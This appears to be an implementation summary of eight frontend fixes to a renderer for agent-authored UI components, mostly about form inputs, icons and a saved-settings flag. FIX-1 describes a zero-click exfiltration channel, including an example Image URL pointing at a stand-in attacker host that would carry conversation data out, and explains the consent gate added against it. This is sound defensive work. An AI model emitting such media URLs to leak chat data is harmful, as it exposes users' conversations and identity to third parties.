implementation_summary: Fixes the eight frontend defects raised by the three review lenses, all in the A2UI renderer plus the assistant-save path. FIX-1 (src/a2ui/sanitizeUrl.ts, src/a2ui/fallback.tsx, src/a2ui/factory.tsx, src/a2ui/registry.tsx): scheme filtering alone left a zero-click exfiltration channel -- an agent-authored {component:'Image', url:'https://attacker/?d=<conversation data>'} was fetched automatically with the user's IP and a Referer carrying the chat/assistant GUIDs. The project has no CSP and no trusted-domain list (grep over src, index.html, vite.config.ts for Content-Security-Policy / img-src / allowedDomains returns nothing), so an allowlist is not implementable without a product decision. Instead createMediaRender now gates every sanitized media URL behind explicit user consent -- the new A2uiMediaConsent component (fallback.tsx) shows 'Load image/video/audio' plus the target host from the new agentUrlHost() helper, and the media element is mounted only after the click, so no request leaves the browser until the user asks for it (the email-client model). This applies uniformly to Image, Video and AudioPlayer because it lives in the shared media factory. On top of that the elements themselves carry MEDIA_PRIVACY_PROPS = referrerPolicy='no-referrer' + crossOrigin='anonymous' (no chat identifiers in the Referer, no cookies/credentials), and video/audio get preload='none' so the controls do not fetch metadata on mount. FIX-2 (registry.tsx DateTimeInputRenderer): enableDate/enableTime are both .default(false).optional(), so a component with neither flag is schema-valid and reached the renderer, which returned null -- an invisible field that can still carry checks and block the submit Button with no explanation. enableDate is now derived as Boolean(rest.enableDate) || !enableTime, i.e. neither-flag falls back to the date picker (the component is a date/time input; date is its primary reading and the DS control is date-based), time-only and date(+time) behave exactly as before. FIX-3 (registry.tsx normalizeChoiceOptions, now exported): value is both the React key and the identity of a selection, and String(x ?? '') gave every option without a value the same '' identity -- duplicate keys, every such radio/checkbox checked at once via values.includes(''), and ['' ] submitted. Options are now dropped unless value is a string/number that is non-empty after trimming, duplicates of an already-seen value are dropped as well, and an empty label falls back to the value so no option renders blank. If nothing survives, the picker degrades to A2uiFallback (text note) rather than rendering a control that cannot submit anything meaningful. FIX-4 (registry.tsx ChoicePickerRenderer): the bound value is now filtered to values that still match a rendered option and de-duplicated, and single-choice mode (variant 'mutuallyExclusive' OR absent -- the catalog default is mutuallyExclusive) resolves one 'selected' value used for the radio and Select branches, so a cap of one is enforced by the renderer instead of being left to the browser's radio-group behaviour; multipleSelection keeps checkboxes and can no longer emit the same value twice. Numeric caps for multipleSelection are NOT derivable client-side: the generic binder passes `checks` through as the original rule array whose `condition` is an arbitrary expression tree (a cap is typically a `length` call nested in comparisons), so there is no reliable way to read a max out of it -- caps expressed as checks are still enforced, because a failing check sets isValid=false and ButtonRenderer disables the submit button, and the server re-validates on intake. FIX-5 (registry.tsx ICON_COMPONENTS): the map covered 25 of the 59 names in the catalog's Icon enum while the backend advertises the whole enum to the model, so the other 34 rendered as an empty grey square. The map now covers 53 names against the closest design-system glyph (accountCircle/person->user, arrowForward/fastForward/skipNext->chevron-right, rewind/skipPrevious->chevron-left, calendarToday/event->history, camera/photo->video, favorite->star-filled, star/starHalf/starOff/favoriteOff->star-outline, home->applications, locationOn->pin, lock/lockOpen->protect, mail->chat, send->chat-arrow, payment/shoppingCart->currency, pause->stop, print->paper, upload->export, moreVert/moreHoriz->navigation-more, notifications/notificationsOff->notification, warning/error->alert, ...), and everything else -- the six names with no counterpart in the set (call, phone, volumeUp/Down/Mute/Off) and the catalog's custom {svgPath} form, whose agent-authored path data is deliberately never injected into the DOM -- resolves to DEFAULT_ICON (the DS question glyph), a real SVG rather than an empty box; the accessible label always carries the exact catalog name. FIX-6 (registry.tsx): TextFieldRenderer gained a number branch that writes the parsed number through the new exported parseNumberFieldValue (undefined for an empty or unparsable buffer -- a browser reports a half-typed '1e' as an empty value, indistinguishable from a cleared field, and both mean 'no number yet', which the component's own required check reports), so the agent receives 3 rather than '3'; the renderer's value type widened to string | number | undefined. SliderRenderer now writes its displayed effective value into the data model on mount when the model holds no number, so the user is no longer shown a position (min) that the agent never receives; the effect is guarded on hasValue so it cannot loop. FIX-7 (src/store/utils/assistants.ts): interactive_enabled was read as `assistant.interactive_enabled ?? false`, so an assistant loaded from a backend, cache or exported JSON predating the field displayed OFF and any save silently disabled interactivity. The new readInteractiveEnabled() prefers an explicit boolean and otherwise treats any enabled group in the legacy interactive_features object (read through a safe unknown-field access, since the type is already deleted) as enabled; marked as temporary compat for the rollout window. FIX-8 (InteractiveFeaturesSection.tsx): SUPPORTED_COMPONENTS now comes from '@/a2ui/components' (the dependency-free list) instead of '@/a2ui/registry', so the assistant form no longer drags the whole A2UI runtime and the design-system icon set into its bundle for a .length; the form's integration test keeps its own import and stays green.
